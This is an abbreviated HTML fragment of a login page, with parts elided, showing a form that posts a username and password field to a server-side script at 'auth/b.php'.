...
<html lang="en" class="notranslate">
  ...
  <body>
    <div class="container">
        ...
        <form method="post" action="auth/b.php">
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -25px auto;">
                    <div>
                        ...
                        <input name="username" id="user" type="text" class="bubble-element Input form-log" placeholder="Username" maxlength="" style="border-radius: 5px 5px 0px 0px;" required>
                    </div>
                    <div style="margin-top: 1px">
                        <i class="ion-ios-locked-outline" id="ionIcons"></i>
                        <input type="password" name="password" id="password" class="bubble-element Input form-log" placeholder="Password" maxlength="" style="border-radius: 0px 0px 5px 5px;" required>
